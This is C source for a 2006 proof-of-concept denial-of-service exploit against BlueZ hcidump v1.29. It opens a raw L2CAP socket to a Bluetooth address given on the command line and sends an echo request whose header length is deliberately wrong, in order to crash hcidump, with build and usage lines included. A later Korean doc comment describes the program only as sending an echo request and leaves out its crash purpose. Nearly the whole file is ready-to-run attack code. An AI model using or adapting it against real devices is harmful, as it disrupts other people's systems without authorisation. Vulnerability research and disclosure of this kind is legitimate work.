/*	Bluez hcidump v1.29 DoS - PoC code			*/
/* 	Pierre BETOUIN <pierre.betouin@security-labs.org>	*/
/*	01/18/06						*/
/*	Crashes hcidump sending bad L2CAP packet		*/
/*								*/
/*	gcc -lbluetooth hcidump-crash.c -o hcidump-crash	*/
/*	./hcidump-crash 00:80:37:XX:XX:XX			*/
/*	L2CAP packet sent (15)					*/
/*	Buffer: 08 01 0C 00 41 41 41 41 41 41 41 41 41 41 41	*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#define SIZE		15
#define FAKE_SIZE	12

/**
 * @brief   블루투스 L2CAP 프로토콜을 사용하여 특정 장치에 에코 요청을 보내는 프로그램
 * 
 * @param argc  명령줄 인수의 개수
 * @param argv  명령줄 인수 배열, 여기서 argv[1]은 블루투스 장치의 주소
 *
 * @return      성공 시 EXIT_SUCCESS, 실패 시 해당 오류에 따라 프로그램 종료
 *
 * 이 함수는 블루투스 소켓을 생성하고 이를 특정 주소로 바인딩한 후, 연결을 설정합니다.
 * 연결이 성공하면 L2CAP 에코 요청 패킷을 생성하여 전송합니다.
 * 패킷이 성공적으로 전송되면 버퍼의 내용을 16진수로 출력합니다.
 * 메모리 할당 실패, 소켓 생성 실패, 바인딩 실패, 연결 실패 등의 경우 오류 메시지를 출력하고 프로그램을 종료합니다.
 */
int main(int argc, char **argv)
{
    char *echo_buffer;
    l2cap_cmd_hdr *echo_cmd_hdr;
    struct sockaddr_l2 l2cap_sockaddr;
    int bt_socket, bytes_sent, index;

    if(argc < 2)
    {
        fprintf(stderr, "%s <btaddr>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    if ((bt_socket = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
    {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&l2cap_sockaddr, 0, sizeof(l2cap_sockaddr));
    l2cap_sockaddr.l2_family = AF_BLUETOOTH;

    if (bind(bt_socket, (struct sockaddr *) &l2cap_sockaddr, sizeof(l2cap_sockaddr)) < 0) 
    {
        perror("bind");
        exit(EXIT_FAILURE);
    }

    str2ba(argv[1], &l2cap_sockaddr.l2_bdaddr);

    if (connect(bt_socket, (struct sockaddr *) &l2cap_sockaddr, sizeof(l2cap_sockaddr)) < 0) 
    {
        perror("connect");
        exit(EXIT_FAILURE);
    }

    if(!(echo_buffer = (char *) malloc((int) SIZE + 1))) 
    {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    memset(echo_buffer, 'A', SIZE);

    echo_cmd_hdr = (l2cap_cmd_hdr *) echo_buffer;
    echo_cmd_hdr->code = L2CAP_ECHO_REQ;
    echo_cmd_hdr->ident = 1;
    echo_cmd_hdr->len = FAKE_SIZE;

    if((bytes_sent = send(bt_socket, echo_buffer, SIZE, 0)) >= 0)
    {
        printf("L2CAP packet sent (%d)\n", bytes_sent);
    }

    printf("Buffer:\t");
    for(index = 0; index < bytes_sent; index++)
        printf("%.2X ", (unsigned char) echo_buffer[index]);
    printf("\n");

    free(echo_buffer);
    close(bt_socket);
    return EXIT_SUCCESS;
}
